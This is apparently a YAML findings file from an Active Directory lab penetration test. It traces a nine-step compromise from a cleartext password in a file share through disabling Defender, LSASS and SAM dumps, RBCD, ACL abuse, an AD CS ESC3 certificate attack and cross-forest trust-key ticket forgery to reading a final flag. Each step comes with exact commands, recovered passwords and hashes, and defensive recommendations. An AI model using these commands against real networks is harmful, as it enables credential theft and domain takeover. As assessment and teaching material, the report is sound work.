# =============================================================================
# Findings: the "Compromise Path", rendered in order.
# =============================================================================
findings:
  # ---------------------------------------------------------------------------
  - title: "F-1 · Initial Foothold, Cleartext Credentials in a File Share"
    hostname: "STUDVM"
    fqdn: "studvm.tech.corp"
    os_details: "Windows 10 (foothold workstation)"
    description: |
      Starting as the unprivileged user `tech\studentuser`, enumeration of
      accessible SMB shares revealed a non-default share named **`maintenance`**
      on the domain controller that was readable by standard users. It contained
      a PowerShell backup script, `Backup-ADSystemStateAndGPO.ps1`, in which the
      **cleartext password of the local administrator account `studentadmin`**
      had been hard-coded. Storing credentials in a world-readable script is a
      classic operational mistake and it provided the first privilege
      escalation on the foothold host.
    compromise_steps: |
      Enumerate shares on the domain controller and open the unusual
      `maintenance` share:

      ```powershell
      net view \\tech-dc.tech.corp
      # ... maintenance   Disk ...
      dir \\tech-dc.tech.corp\maintenance\
      #  Backup-ADSystemStateAndGPO.ps1
      ```

      ![The `maintenance` share and the backup script it exposes](images/img15.png)

      Reading the script reveals the hard-coded credentials for `studentadmin`:

      ![Cleartext `studentadmin` password inside the backup script](images/img16.png)

      Authenticate as the recovered local administrator:

      ```text
      Username : studentadmin
      Password : P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!

      runas /user:studentadmin "cmd.exe"
      # Attempting to start cmd.exe as user "studvm\studentadmin" ...
      ```

      ![`runas` as the recovered `studentadmin` account](images/img17.png)
    recommendation: |
      - **Never store credentials in scripts** on file shares. Move the backup
        job to a **Group Managed Service Account (gMSA)** whose password is
        machine-managed and never exposed.
      - Restrict the `maintenance` share ACL to only the accounts that require it,
        and audit SYSVOL/NETLOGON and custom shares for embedded secrets.
      - Rotate the `studentadmin` password immediately and enforce **LAPS** so the
        local administrator password is unique per host.
    references:
      - "https://attack.mitre.org/techniques/T1552/001/"
      - "https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview"

  # ---------------------------------------------------------------------------
  - title: "F-2 · Local Privilege Escalation and LSASS Credential Theft"
    hostname: "STUDVM"
    fqdn: "studvm.tech.corp"
    os_details: "Windows 10 (foothold workstation)"
    description: |
      With local administrator rights as `studentadmin`, we established full
      control of STUDVM: real-time protection was disabled, the original
      `studentuser` was added to the local Administrators group for a stable
      high-integrity session, and LSASS was dumped with an evasive build of
      Mimikatz. This yielded the **NTLM hash of the machine account `STUDVM$`**,
      which becomes the key to the delegation attack in finding F-4.
    compromise_steps: |
      Disable Defender real-time monitoring and grant `studentuser` local admin:

      ```powershell
      Set-MpPreference -DisableRealtimeMonitoring $true
      net localgroup administrators TECH\studentuser /add
      ```

      ![Defender real-time monitoring disabled](images/img18.png)

      ![Adding `studentuser` to the local Administrators group](images/img19.png)

      Dump credentials from LSASS with SafetyKatz launched through a loader:

      ```powershell
      Loader.exe -path SafetyKatz.exe -args "sekurlsa::evasive-logonpasswords" "exit"
      ```

      The machine account hash is recovered:

      ```text
      * Username : studvm$
      * Domain   : TECH
      * NTLM     : 354cc671b0e734b885308de998576b0b
      ```

      ![`STUDVM$` machine-account NTLM hash recovered from LSASS](images/img20.png){.evidence}

      ![`studentuser` NTLM hash also recovered from LSASS](images/img21.png)
    recommendation: |
      - Deploy **LAPS** and **Windows Defender Credential Guard** to protect LSASS
        secrets and prevent machine/domain credential reuse.
      - Enable **Defender Tamper Protection** to prevent `Set-MpPreference` from
        disabling real-time protection, and alert on Defender Operational events
        5001/5007 (protection-state changes) and on local-administrators group
        membership changes.
      - Place high-value accounts in the **Protected Users** group and enforce a
        tiered administration model.
    references:
      - "https://attack.mitre.org/techniques/T1003/001/"
      - "https://learn.microsoft.com/windows/security/identity-protection/credential-guard/"

  # ---------------------------------------------------------------------------
  - title: "F-3 · Domain Reconnaissance and Attack-Path Discovery"
    hostname: "tech.corp (domain-wide)"
    fqdn: "tech-dc.tech.corp"
    os_details: "Windows Server 2022 Datacenter (Domain Controller)"
    description: |
      Automated and manual enumeration built the map that drove every later
      step. adPEAS and PowerView revealed the forest trust to `finance.corp`, an
      unconstrained-delegation domain controller, `ms-DS-MachineAccountQuota`
      left at the default of 10, no LAPS anywhere in the domain, and an
      unprotected Tier-0 admin. The privileged account **`techadmin`** is in fact
      the renamed built-in Administrator (RID 500) and is a direct member of both
      **Domain Admins and Enterprise Admins**, with `admincount=1` and no
      Protected Users membership. adPEAS also flagged an AD CS certificate
      authority publishing an ESC3-vulnerable template, and BloodHound confirmed a
      short path to Domain Admin.
    compromise_steps: |
      From the STUDVM foothold the domain was identified and adPEAS was run for
      automated enumeration:

      ![Initial foothold on the STUDVM workstation](images/img00.png)

      ![Domain identified from the foothold host](images/img01.png)

      ![Running adPEAS for automated domain enumeration](images/img02.png)

      adPEAS identifies the domain and the **bidirectional, quarantined trust**
      to `finance.corp`:

      ```text
      domainNameDNS   : tech.corp
      domainSID       : S-1-5-21-1600556212-896947471-994435180
      trustPartner    : finance.corp   (Bidirectional, Transitive, QUARANTINED_DOMAIN)
      ```

      ![Forest trust to `finance.corp` discovered by adPEAS](images/img04.png)

      ![adPEAS: domain, domain controller and Kerberos policy overview](images/img03.png){.evidence}

      ![adPEAS: LDAP and SMB signing configuration from GPO](images/img05.png){.evidence}

      Privileged-account enumeration shows `techadmin` is the RID 500 account and
      sits in every Tier-0 group:

      ```text
      sAMAccountName : techadmin
      objectSid      : S-1-5-21-1600556212-896947471-994435180-500
      privilegedGroups : Domain Admins, Enterprise Admins, Schema Admins, Administrators
      description    : Built-in account for administering the computer/domain
      ```

      ![`techadmin` (RID 500) in Domain Admins and Enterprise Admins](images/img10.png){.evidence}

      ![Unprotected Tier-0: `techadmin` is not in the Protected Users group](images/img11.png)

      ![`ms-DS-MachineAccountQuota` set to 10 (any user may join computers)](images/img06.png)

      ![LAPS not deployed: all five computers unprotected](images/img13.png)

      ![Domain controller computer object (trusted for delegation)](images/img12.png)

      ![AD CS certificate authority and its published templates](images/img07.png){.evidence}

      ![`FIDO` template flagged ESC3 (Certificate Request Agent / Enrollment Agent)](images/img08.png){.evidence}

      ![`FIDOUsers` template also flagged ESC3](images/img09.png){.evidence}

      Key weaknesses surfaced during enumeration:

      | Observation | Impact |
      | :--- | :--- |
      | `ms-DS-MachineAccountQuota` = 10 | Any user can join computer accounts |
      | No LAPS (0 / 5 computers) | Local admin password reuse across hosts |
      | `techadmin` not in Protected Users | Tier-0 account exposed to theft/impersonation |
      | AD CS template `FIDO` / `FIDOUsers` | ESC3 enrollment-agent abuse possible |

      Session hunting and delegation checks point at the next targets:

      ```powershell
      Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
      # adminsrv86  TECH\causer       False
      # mgmtsrv     TECH\techservice  False
      Get-DomainComputer -Unconstrained | select name, useraccountcontrol
      # tech-dc  SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
      ```

      ![BloodHound shortest path to Domain Admin](images/img14.png){.evidence}

      ![Invoke-SessionHunter: privileged sessions on ADMINSRV86 and MGMTSRV](images/img22.png)

      ![Find-PSRemotingLocalAdminAccess enumeration](images/img23.png)

      ![Get-DomainComputer -Unconstrained: TECH-DC trusted for delegation](images/img24.png)
    recommendation: |
      - Lower `ms-DS-MachineAccountQuota` to **0** so standard users cannot create
        computer accounts (a prerequisite for several delegation attacks).
      - Deploy LAPS, add Tier-0 accounts such as `techadmin` to **Protected
        Users**, and review AD CS template permissions (see F-8).
      - Monitor for enumeration tooling (LDAP-heavy queries, SharpHound
        collection patterns).
    references:
      - "https://attack.mitre.org/techniques/T1087/002/"
      - "https://bloodhound.readthedocs.io/"

  # ---------------------------------------------------------------------------
  - title: "F-4 · Resource-Based Constrained Delegation (RBCD) to MGMTSRV"
    hostname: "MGMTSRV"
    fqdn: "mgmtsrv.tech.corp"
    os_details: "Windows Server (member server)"
    description: |
      The compromised machine account `STUDVM$` held write access over the
      `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of **MGMTSRV**. This
      is the precondition for **Resource-Based Constrained Delegation**: by
      pointing MGMTSRV's delegation back at `STUDVM$` we could use the Kerberos
      S4U extensions to impersonate **any** user (including the Domain Admin
      `techadmin`) to services on MGMTSRV, giving full command execution on the
      host. Dumping the server then yielded the `techservice` account used in the
      next stage.
    compromise_steps: |
      Request a TGT for the machine account using its hash (Over-Pass-the-Hash):

      ```powershell
      Rubeus.exe asktgt /user:studvm$ /rc4:354cc671b0e734b885308de998576b0b `
        /domain:tech.corp /dc:tech-dc.tech.corp /ptt
      ```

      ![Over-Pass-the-Hash: a TGT is requested for the `STUDVM$` machine account](images/img25.png)

      Configure RBCD so MGMTSRV trusts `STUDVM$` to act on behalf of others:

      ```powershell
      Set-DomainRBCD -Identity MGMTSRV -DelegateFrom "STUDVM$"
      ```

      ![Configuring Resource-Based Constrained Delegation on MGMTSRV](images/img26.png)

      Use S4U2Self and S4U2Proxy to impersonate the Domain Admin `techadmin`:

      ```powershell
      Rubeus.exe s4u /user:studvm$ /rc4:354cc671b0e734b885308de998576b0b `
        /impersonateuser:techadmin /msdsspn:http/mgmtsrv.tech.corp `
        /altservice:host,wsman,cifs,rpcss /domain:tech.corp /dc:tech-dc.tech.corp /ptt /nowrap
      ```

      ![S4U2Self/S4U2Proxy forging a `techadmin` service ticket to MGMTSRV](images/img27.png){.evidence}

      With the ticket injected, operating-system-level command execution on
      MGMTSRV as `techadmin` is confirmed:

      ```text
      winrs -r:mgmtsrv.tech.corp cmd
      Microsoft Windows [Version 10.0.20348.4052]
      C:\Users\techadmin>
      ```

      ![OS command execution on MGMTSRV as `techadmin`](images/img28.png)

      The host's credentials are then dumped, revealing the `techservice` service
      account used in F-5:

      ```text
      * Username : techservice
      * Domain   : TECH
      * NTLM     : 4311a88033b35fbbd00a681b005b6ead
      ```

      ![`techservice` credentials recovered from MGMTSRV](images/img31.png)

      ![Full credential dump on MGMTSRV (1/2)](images/img29.png){.evidence}

      ![Full credential dump on MGMTSRV (2/2)](images/img30.png){.evidence}

      ![`MGMTSRV$` machine-account hash also recovered](images/img32.png)
    recommendation: |
      - Audit and remove write access to **`msDS-AllowedToActOnBehalfOfOtherIdentity`**
        for non-administrative principals; no account should be able to configure
        delegation on a computer object it does not own (the write access
        `STUDVM$` held over MGMTSRV is exactly this problem).
      - Mark Tier-0 accounts as **sensitive and cannot be delegated** so they
        cannot be impersonated through S4U even where delegation is configured.
      - Monitor Event ID 4769 for S4U ticket requests referencing privileged
        users.
    references:
      - "https://attack.mitre.org/techniques/T1558/003/"
      - "https://learn.microsoft.com/windows-server/security/kerberos/kerberos-constrained-delegation-overview"

  # ---------------------------------------------------------------------------
  - title: "F-5 · Active Directory ACL Abuse, AddSelf and Force-Change-Password"
    hostname: "tech.corp (Directory ACLs)"
    fqdn: "tech-dc.tech.corp"
    os_details: "Active Directory object permissions"
    description: |
      The `techservice` account recovered from MGMTSRV held a dangerous ACL
      chain. It could **add itself** to the privileged `Management` group
      (a `Self` / `Self-Membership` right), and the `Management` group in turn
      held **`User-Force-Change-Password`** over the user `puretech`. By walking
      this chain we reset `puretech`'s password without knowing its current
      value, a pure permissions abuse that requires no cracking.
    compromise_steps: |
      Enumerate what `techservice` can do, and the group's rights over `puretech`:

      ```powershell
      # techservice -> Management (Self-Membership)
      # Management  -> puretech    (User-Force-Change-Password)
      ```

      ![`Management` group holds Force-Change-Password over `puretech`](images/img35.png)

      ![Domain groups: `Management` and `srvusers` stand out as custom groups](images/img33.png)

      ![`techservice` ACLs, including Self-Membership on `Management`](images/img34.png){.evidence}

      ![`techservice` Self-Membership right over the `Management` group](images/img36.png)

      ![Confirming `Management` holds User-Force-Change-Password over `puretech`](images/img40.png){.evidence}

      Add `techservice` into the `Management` group:

      ```powershell
      Add-DomainGroupMember -Identity "Management" -Members "techservice" -Domain tech.corp -Verbose
      # VERBOSE: [Add-DomainGroupMember] Adding member 'techservice' to group 'Management'
      ```

      ![Self-adding `techservice` into the privileged `Management` group](images/img39.png)

      The new group membership only takes effect in a **fresh ticket**, so request
      a new TGT for `techservice` in a sacrificial logon session before using the
      group's rights:

      ```powershell
      Rubeus.exe asktgt /user:techservice /rc4:4311a88033b35fbbd00a681b005b6ead `
        /domain:tech.corp /dc:tech-dc.tech.corp /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
      ```

      ![Fresh `techservice` TGT requested after the group change](images/img41.png)

      ![Requesting the `techservice` TGT in a new window](images/img37.png)

      ![Operating inside the refreshed `techservice` session](images/img38.png)

      With the refreshed context, force-reset the `puretech` password:

      ```powershell
      Set-DomainUserPassword -Identity puretech -AccountPassword $pass -Verbose
      # VERBOSE: [Set-DomainUserPassword] Password for user 'puretech' successfully reset
      ```

      ![Force-resetting the `puretech` account password](images/img42.png)

      A logon as `puretech` is then obtained, giving a fresh identity to pivot
      with:

      ![Interactive session as `puretech`](images/img44.png)

      ![Requesting a `puretech` TGT in a sacrificial process](images/img43.png)

      ![Confirmed access as `puretech`](images/img45.png)
    recommendation: |
      - Remove the **Self-Membership** ACE that lets `techservice` add itself to
        `Management`, and the **User-Force-Change-Password** right the group holds
        over `puretech`; grant such rights only to dedicated, monitored admin
        roles.
      - Run regular ACL reviews (BloodHound, `Get-DomainObjectAcl`) to catch
        privilege-granting ACEs on users and groups.
      - Alert on Event ID 4724/4738 (password reset / account change) for
        sensitive accounts.
    references:
      - "https://attack.mitre.org/techniques/T1098/"
      - "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html"

  # ---------------------------------------------------------------------------
  - title: "F-6 · Lateral Movement to TECHSRV30 and Local Secret Extraction"
    hostname: "TECHSRV30"
    fqdn: "techsrv30.tech.corp"
    os_details: "Windows Server (member server)"
    description: |
      The `puretech` account held local administrator rights on **TECHSRV30**,
      confirmed by an interactive `winrs` session whose `whoami /priv` output
      shows the full set of administrative privileges enabled (SeDebug,
      SeBackup, SeRestore, SeTakeOwnership and others). After relaying tooling to
      the host, the SAM and cached secrets were extracted, exposing the local
      administrator `securetech` and the machine account `TECHSRV30$`. `TECHSRV30$`
      is a member of the custom **`srvusers`** group through a `Self-Membership`
      ACL; that group membership is the pivot used to reach ADMINSRV86 in F-7.
    compromise_steps: |
      Confirm local administrator command execution on TECHSRV30 as `puretech`:

      ```text
      winrs -r:techsrv30.tech.corp cmd
      C:\Users\puretech> whoami /priv
      # SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege,
      # SeTakeOwnershipPrivilege, SeImpersonatePrivilege ... all Enabled
      ```

      ![OS command execution and full privileges as `puretech` on TECHSRV30](images/img46.png){.evidence}

      TECHSRV30 could not reach the operator tooling directly, so a **port-proxy**
      was configured on the host to relay traffic back through the STUDVM
      foothold, from which the loader and SafetyKatz were staged:

      ```powershell
      netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 `
        connectport=80 connectaddress=<STUDVM foothold>
      ```

      ![Staging the loader onto TECHSRV30 through the port-proxy](images/img47.png)

      ![Port-proxy configured and SafetyKatz run through the loader](images/img48.png)

      The machine account is recovered from LSASS:

      ```text
      * Username : techsrv30$
      * Domain   : TECH
      * NTLM     : 04b37fd7d28ab7c9b3cbe36336d19581
      ```

      ![`TECHSRV30$` machine-account hash recovered](images/img49.png)

      Elevate to SYSTEM and dump the SAM to recover the local administrator
      `securetech` (RID 500):

      ```text
      C:\Temp\sk.exe "token::elevate" "lsadump::evasive-sam" "exit"

      RID  : 000001f4 (500)
      User : securetech
      Hash NTLM: abbd00c18b8ff34770238a08e98f4932
      ```

      ![SAM dump on TECHSRV30 exposing the local admin `securetech`](images/img51.png){.evidence}
    recommendation: |
      - Deploy **LAPS** to eliminate shared local-administrator passwords across
        member servers.
      - Restrict who holds local administrator rights on application servers and
        review membership of custom groups such as `srvusers`.
      - Enable **Credential Guard** and monitor for SAM/LSA dumping (Event ID
        4688 with suspicious process lineage).
    references:
      - "https://attack.mitre.org/techniques/T1003/002/"
      - "https://attack.mitre.org/techniques/T1021/"

  # ---------------------------------------------------------------------------
  - title: "F-7 · Group-Membership Pivot to ADMINSRV86 and LSA Secrets Harvest"
    hostname: "ADMINSRV86"
    fqdn: "adminsrv86.tech.corp"
    os_details: "Windows Server (member server)"
    description: |
      This finding is the bridge from TECHSRV30 (F-6) to the certificate attack
      (F-8). Because `TECHSRV30$` holds a `Self-Membership` right on the
      **`srvusers`** group, and that group grants local administrator rights on
      **ADMINSRV86**, we added `TECHSRV30$` to `srvusers`, requested a
      `TECHSRV30$` ticket in a sacrificial session, and used it to reach
      ADMINSRV86. Dumping LSA secrets there exposed the **`causer`** account
      (stored as the `SNMPTRAP` service credential) in cleartext, along with the
      `ADMINSRV86$` machine account. `causer` is the account that holds the
      certificate-enrollment rights abused in F-8.
    compromise_steps: |
      `TECHSRV30$` has a `Self-Membership` ACE on `srvusers`; add it to the group:

      ```powershell
      Add-DomainGroupMember -Identity "srvusers" -Members "techsrv30$" -Domain tech.corp -Verbose
      # VERBOSE: [Add-DomainGroupMember] Adding member 'techsrv30$' to group 'srvusers'

      Get-DomainGroupMember -Identity "srvusers"
      # MemberName : TECHSRV30$   (S-1-5-21-1600556212-896947471-994435180-1104)
      ```

      ![`TECHSRV30$` self-added to the `srvusers` group (local admin on ADMINSRV86)](images/img53.png)

      ![`srvusers` group and its Self-Membership ACE for `TECHSRV30$`](images/img52.png){.evidence}

      ![`srvusers` membership confirmed: `TECHSRV30$`](images/img54.png)

      Request a `TECHSRV30$` TGT in a sacrificial logon session, giving admin
      access to ADMINSRV86 through the `srvusers` membership:

      ```powershell
      Rubeus.exe asktgt /user:techsrv30$ /rc4:04b37fd7d28ab7c9b3cbe36336d19581 `
        /domain:tech.corp /dc:tech-dc.tech.corp /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
      ```

      ![`TECHSRV30$` ticket requested for the pivot to ADMINSRV86](images/img55.png){.evidence}

      On ADMINSRV86, dump LSA secrets and recover the `causer` service password in
      cleartext:

      ```text
      Secret : _SC_SNMPTRAP / service 'SNMPTRAP' with username : causer@tech.corp
      cur/text: Ca@8170734525364357
      ```

      ![`causer` password recovered from the SNMPTRAP LSA secret](images/img56.png){.evidence}

      The `ADMINSRV86$` machine account is also recovered:

      ```text
      * Username : adminsrv86$
      * Domain   : TECH
      * NTLM     : 390d9db95b492e45c4e43b85d2b9c432
      ```

      ![`ADMINSRV86$` machine account recovered](images/img57.png)

      ![Credential dump on ADMINSRV86](images/img58.png){.evidence}
    recommendation: |
      - Remove the `Self-Membership` ACE that lets `TECHSRV30$` join `srvusers`,
        and review why a computer account grants local admin on ADMINSRV86.
      - Avoid running services under domain user accounts with static passwords;
        migrate `SNMPTRAP` and similar services to **gMSA**.
      - Restrict local administrator access so LSA secrets cannot be read, and
        enable **Credential Guard**.
    references:
      - "https://attack.mitre.org/techniques/T1003/004/"
      - "https://attack.mitre.org/techniques/T1098/"

  # ---------------------------------------------------------------------------
  - title: "F-8 · AD CS ESC3, Enrollment-Agent Abuse to Domain Admin"
    hostname: "TECH-DC (tech-tech-dc-CA)"
    fqdn: "tech-dc.tech.corp"
    os_details: "Windows Server 2022, Active Directory Certificate Services"
    description: |
      The certificate authority `tech-tech-dc-CA` published a template (`FIDO`)
      whose Extended Key Usage included **Certificate Request Agent** and which
      `causer` was permitted to enrol in, the classic **ESC3** misconfiguration.
      An enrollment-agent certificate can request certificates *on behalf of* any
      other user. Using `causer`, we enrolled an agent certificate, then requested
      a certificate for the Domain Admin **`techadmin`** via the `FIDOUsers`
      template, used that certificate to authenticate with **PKINIT**, obtained a
      Domain Admin TGT, and proved operating-system-level command execution on the
      domain controller.
    compromise_steps: |
      Launch a logon session as `causer` with the recovered password, then request
      the enrollment-agent certificate from the `FIDO` template and convert it to
      PFX:

      ```powershell
      runas /user:TECH\causer /netonly cmd.exe
      .\Certify.exe request /ca:tech-dc.tech.corp\tech-tech-dc-CA /template:FIDO
      .\openssl\openssl.exe pkcs12 -in .\esc3agent.pem -keyex `
        -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out .\esc3agent.pfx
      ```

      ![Requesting the FIDO enrollment-agent certificate as `causer`](images/img60.png)

      ![`causer` identified as a principal able to enrol in the FIDO (ESC3) template](images/img50.png)

      ![Launching a logon session as `causer` (runas /netonly)](images/img59.png)

      ![Converting the enrollment-agent certificate to PFX](images/img61.png){.evidence}

      Use the agent certificate to request a certificate **on behalf of**
      `techadmin` from the `FIDOUsers` template:

      ```powershell
      .\Certify.exe request /ca:tech-dc.tech.corp\tech-tech-dc-CA /template:FIDOUsers `
        /onbehalfof:TECH\techadmin /enrollcert:.\esc3agent.pfx /enrollcertpw:123456
      # [*] CA Response : The certificate had been issued.
      ```

      ![On-behalf-of certificate issued for the Domain Admin `techadmin`](images/img62.png){.evidence}

      ![Converting the `techadmin` certificate to PFX](images/img63.png){.evidence}

      Convert the `techadmin` certificate and authenticate via PKINIT to receive a
      **Domain Admin TGT**:

      ```powershell
      .\openssl\openssl.exe pkcs12 -in .\esc3DA.pem -keyex `
        -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out .\esc3DA.pfx
      .\Rubeus.exe asktgt /user:techadmin /certificate:.\esc3DA.pfx /password:123456 `
        /domain:tech.corp /dc:tech-dc.tech.corp /ptt /nowrap
      # UserName : techadmin (NT_PRINCIPAL)   ->  ticket for krbtgt/tech.corp
      ```

      Confirm operating-system-level command execution on the domain controller as
      `techadmin`, satisfying the scope objective for TECH-DC:

      ```text
      klist
      #  Client: techadmin @ TECH.CORP
      winrs -r:tech-dc.tech.corp "whoami && hostname"
      #  tech\techadmin
      #  tech-dc
      ```

      ![Domain Admin TGT via PKINIT and OS command execution on TECH-DC](images/img65.png){.evidence}
    recommendation: |
      - Remove the **Certificate Request Agent** EKU from the `FIDO` template, or
        restrict enrollment to a small, trusted group and require **CA manager
        approval** for issuance.
      - Restrict the `FIDOUsers` template so enrollment agents cannot request on
        behalf of Tier-0 accounts; enable the **enrollment-agent restrictions**
        on the CA.
      - Monitor for `Certify` / certificate-request activity and PKINIT logons for
        privileged users.
    references:
      - "https://attack.mitre.org/techniques/T1649/"
      - "https://posts.specterops.io/certified-pre-owned-d95910965cd2"

  # ---------------------------------------------------------------------------
  - title: "F-9 · Cross-Forest Compromise, Trust-Key Forgery into finance.corp"
    hostname: "FINANCE-DC"
    fqdn: "finance-dc.finance.corp"
    os_details: "Windows Server 2022 (finance.corp Domain Controller)"
    description: |
      With Domain Admin in `tech.corp` we extracted the **inter-realm trust key**
      for the `tech.corp` / `finance.corp` trust. Because the trust key lets us
      forge an inter-realm TGT that presents as a *native* `finance.corp`
      principal, we impersonated the built-in administrator **`finadmin`**
      (RID 500) and crossed into `finance.corp`. From there we reached a
      cross-forest file share, stole an **unencrypted private key** exposed on it,
      converted it to a certificate, authenticated with PKINIT, and read the final
      objective flag on the `finance.corp` domain controller.

      > **Note on SID filtering.** The trust is marked `QUARANTINED_DOMAIN`, which
      > strips **all** foreign SIDs from the SID-history field of inbound tickets,
      > not only RID 519. A naive Golden Ticket that relies on injecting a foreign
      > *Enterprise Admins* SID (RID 519) via SID history is therefore filtered and
      > rejected. The successful approach avoids SID history entirely: it forges a
      > TGT with the **trust key** whose native realm claim is already
      > `finance.corp`, impersonating a native `finance.corp` account (`finadmin`,
      > RID 500). Because nothing foreign is being smuggled in, there is nothing
      > for the quarantine filter to strip.
    compromise_steps: |
      **Trust-key extraction (as Domain Admin, on TECH-DC).** DCSync the trust
      keys and the `krbtgt` hash:

      ```powershell
      Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
      ```

      ```text
      [ In ] TECH.CORP -> FINANCE.CORP
        rc4_hmac_nt   a0ba8caa534fc2f186ca86ea7b5cee6e     <-- inter-realm trust key
      ```

      ![Inter-realm trust keys extracted via DCSync](images/img67.png){.evidence}

      ![`lsadump::evasive-trust /patch`: In / Out inter-realm trust keys](images/img66.png){.evidence}

      ![DCSync of `tech\krbtgt` (hash used in the superseded attempt)](images/img68.png){.evidence}

      **Attempted approach (blocked by SID filtering).** A cross-forest Golden
      Ticket using the `tech\krbtgt` hash with SID history for `finance.corp`
      Enterprise Admins (RID 519) was rejected by the quarantined trust:

      ```powershell
      # Superseded: foreign RID 519 stripped by SID filtering on the trust
      .\SafetyKatz.exe "kerberos::golden /user:administrator /domain:tech.corp `
        /sid:S-1-5-21-1600556212-896947471-994435180 `
        /sids:S-1-5-21-3132463012-610816204-3671931044-519 `
        /rc4:2e1b94e534db024815fdb30273174dc6 /service:krbtgt /target:finance.corp `
        /ticket:finance.kirbi" "exit"
      ```

      **Working approach: forge an inter-realm TGT with the trust key**,
      impersonating the native `finance.corp` administrator `finadmin` (RID 500):

      ```powershell
      .\mimikatz.exe "kerberos::golden /user:finadmin /domain:tech.corp `
        /sid:S-1-5-21-1600556212-896947471-994435180 `
        /sids:S-1-5-21-3132463012-610816204-3671931044-500 `
        /rc4:a0ba8caa534fc2f186ca86ea7b5cee6e /service:krbtgt /target:finance.corp `
        /ticket:finadmin_in.kirbi" exit
      ```

      Exchange the referral ticket for a CIFS service ticket to FINANCE-DC:

      ```powershell
      .\Rubeus.exe asktgs /ticket:finadmin_in.kirbi `
        /service:cifs/finance-dc.finance.corp /dc:finance-dc.finance.corp /ptt /nowrap
      ```

      ![Inter-realm TGT forged for `finadmin` and exchanged for a CIFS ticket](images/img69.png){.evidence}

      ![CIFS service ticket obtained; `TechOperations` share lists `finadmin.pem`](images/img70.png){.evidence}

      Access the cross-forest share; it exposes an **unencrypted** private key
      `finadmin.pem`. The `openssl` conversion only prompts for an *export*
      password (the one being set), never an *import* password, proving the PEM
      held an unprotected private key:

      ```powershell
      dir \\finance-dc.finance.corp\TechOperations
      #  finadmin.pem   3,988 bytes
      copy \\finance-dc.finance.corp\TechOperations\finadmin.pem `
        C:\Users\studentuser\Desktop\shared\finadmin.pem
      .\openssl\openssl.exe pkcs12 -in .\finadmin.pem -keyex `
        -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out finadmin.pfx
      # Enter Export Password:  <-- only an EXPORT prompt: the PEM key was unencrypted
      ```

      ![Unencrypted `finadmin.pem` stolen from the cross-forest share and converted](images/img71.png){.evidence}

      Authenticate as `finadmin` with **PKINIT**, spawning a fresh logon session
      via `/createnetonly` and injecting the TGT into it:

      ```powershell
      .\Rubeus.exe asktgt /user:finadmin /certificate:.\finadmin.pfx /password:<pfx-password> `
        /domain:finance.corp /dc:finance-dc.finance.corp `
        /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
      ```

      ![PKINIT as `finadmin`: Domain Admin TGT issued for `finance.corp`](images/img72.png){.evidence}

      Verify the ticket, confirm remote access, and read the **final flag**
      locally on FINANCE-DC:

      ```powershell
      klist
      #  Client: finadmin @ FINANCE.CORP
      dir \\finance-dc.finance.corp\C$
      winrs -r:finance-dc.finance.corp "whoami && hostname"
      #  finance\finadmin
      #  finance-dc
      ```

      ![PKINIT TGT verified and OS command execution on FINANCE-DC as `finadmin`](images/img73.png){.evidence}

      ```text
      winrs -r:finance-dc.finance.corp cmd
      C:\Users\finadmin> cd Desktop
      C:\Users\finadmin\Desktop> type finalflag.txt
      64061b82-fb44-48d5-b2d2-761766634e30
      ```

      ![Final objective flag read on FINANCE-DC as `finadmin`](images/img74.png){.evidence}
    recommendation: |
      - **Enforce SID filtering / selective authentication** on the `finance.corp`
        trust in *both* directions so that forged inter-realm tickets, even those
        impersonating native RID 500 accounts, cannot cross the boundary.
      - Treat the **forest**, not the domain, as the security boundary; keep
        highly sensitive assets in a separate, tightly-trusted forest.
      - **Never store unencrypted private keys** on file shares; the exposed
        `finadmin.pem` gave a direct certificate-based logon. Protect private keys
        with strong passphrases and restrictive ACLs.
      - Rotate the **`krbtgt`** account (twice) and the **inter-realm trust key**;
        monitor for anomalous inter-realm TGS requests.
    references:
      - "https://attack.mitre.org/techniques/T1134/005/"
      - "https://attack.mitre.org/techniques/T1649/"
      - "https://learn.microsoft.com/windows-server/identity/ad-ds/manage/understand-security-identifiers"
